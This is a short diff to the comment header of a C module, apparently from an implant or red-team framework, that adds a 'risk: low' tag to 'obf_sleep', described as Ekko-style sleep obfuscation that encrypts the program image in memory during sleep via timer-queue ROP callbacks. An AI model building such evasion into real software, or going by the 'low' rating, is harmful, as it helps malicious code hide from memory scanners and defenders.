@@ -3,6 +3,7 @@
 // provides: obf_sleep
 // headers: windows.h
 // libs: advapi32
+// risk: low
 // note: Ekko-style sleep obfuscation — ROP chain via timer queue callbacks encrypts image during sleep. No attacker code executes during encrypt/decrypt.
 
 #ifndef CHUNK_SLEEP_ENCRYPT
